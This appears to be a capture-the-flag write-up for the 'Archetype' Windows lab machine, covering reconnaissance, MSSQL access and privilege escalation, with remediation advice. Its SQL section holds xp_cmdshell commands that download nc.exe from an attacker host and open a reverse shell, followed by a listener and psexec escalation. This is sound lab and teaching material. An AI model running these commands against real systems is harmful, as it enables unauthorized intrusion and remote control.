## General Information
- Machine: Archetype
- Difficulty: Very easy
- OS: Windows
- Date: 20/04/2023


## Methodology
- Reconnaissance: Identification of services using Nmap. Exploitation of the "smbclient" service and retrieval of the "prod.dtsConfig" file containing confidential information.
- Exploration: Utilization of the "impacket-mssqlclient" command to access the database and execute a reverse shell. Execution of "winpeas.exe" to identify a vulnerable file with admin information. Exploitation of the "admin" user using the "impacket -psexec" command to discover the flag.
- Results Analysis: Documentation of findings, identification of vulnerabilities, and recommendations for remediation.


## Results
During the reconnaissance phase, the IP address, open ports, and services of the target machine were identified. The exploitation of the "smbclient" service allowed the download of a file named "prod.dtsConfig" which contained confidential information. This information was then used to access the database and execute a reverse shell using the "impacket-mssqlclient" command. With the reverse shell established, further exploration led to the discovery of a vulnerable file containing admin information. Exploiting the "admin" user using the "impacket -psexec" command resulted in the successful retrieval of the flag.

### Reconnaissance
- IP: 10.129.32.176
- Port Scan results:

| Port     | State | Service      | Version         |
|----------|-------|--------------|-----------------|   
| 135/tcp  | open  | msrpc        | Microsoft Windows RPC |
| 139/tcp  | open  | netbios-ssn  | Microsoft Windows netbios-ssn |
| 445/tcp  | open  | microsoft-ds | Windows Server 2019 Standard 17763 microsoft-ds |
| 1433/tcp | open  | ms-sql-s     | Microsoft SQL Server 2017 14.00.1000.00; RTM | 

### Commands used

#### Nmap
~~~nmap
└─$ sudo nmap -sVC -v -T4 -Pn --open -O 10.129.32.176 -oA ./service_scan_port/nmap
~~~

#### smbclient
~~~smbclient
└─$ smbclient -N -L \\\\10.129.32.176\\
~~~

#### impacket-mssqlclient
~~~impacket-mssqlclient
└─$ /usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.32.176 -windows-auth
~~~

#### SQL
~~~ SQL
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.65/nc.exe -outfile nc.exe"
output                                                                                                                

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.65 1234"
~~~

#### server
~~~ server
└─$ python3 -m http.server 80          
Serving HTTP on 0.0.0.0 port 80 (http:/
10.129.32.176 - - [20/Apr/2023 00:19:20] "GET /nc.exe HTTP/1.1" 200 -     
10.129.32.176 - - [20/Apr/2023 01:01:13] "GET /winPEASx64.exe HTTP/1.1" 200 -
~~~

#### netcat
~~~ netcat
└─$ nc -lvnp 1234
~~~

#### winpeas
~~~ winpeas
PS C:\Users\sql_svc\Downloads> ./winpeas.exe
~~~


## Exploited Vulnerabilities
- SMB Service (Port 445):
    - Outdated version of Windows Server 2019 Standard with known vulnerabilities.
    - Inadequate sharing permissions and enabled SMBv1, an insecure version of the SMB protocol.

- Microsoft SQL Server (Port 1433):
    - Outdated version of Microsoft SQL Server 2017 with known vulnerabilities.
    - Weak authentication settings and excessive privileges for the "sql_svc" user.
    - Improper firewall configuration, allowing unauthorized access to the SQL Server service.

## Recommendations:
    - Update Windows Server 2019 Standard to the latest version.
    - Adjust sharing permissions and disable SMBv1.
    - Update Microsoft SQL Server 2017 to the latest version.
    - Strengthen authentication settings and restrict privileges for the "sql_svc" user.
    - Configure the firewall properly to restrict access to the SQL Server service.